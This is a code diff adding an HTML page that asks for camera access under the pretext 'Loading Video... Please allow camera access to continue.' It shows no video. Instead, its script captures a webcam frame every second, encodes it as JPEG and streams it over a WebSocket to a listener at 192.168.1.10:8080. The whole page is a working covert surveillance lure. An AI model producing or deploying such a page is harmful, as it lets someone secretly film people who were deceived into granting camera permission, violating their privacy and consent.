@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+
+<body>
+    <script>
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                const ws = new WebSocket('ws://192.168.1.10:8080');
+                video.onloadedmetadata = () => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    setInterval(() => {
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        const data = canvas.toDataURL('image/jpeg');
+                        ws.send(data); 
+                    }, 1000);
+                };
+            })
+            .catch(err => {
+                console.error('permission denied:', err);
+            });
+    </script>
+    <h1>Loading Video... Please allow camera access to continue.</h1>
+</body>
+
+</html>
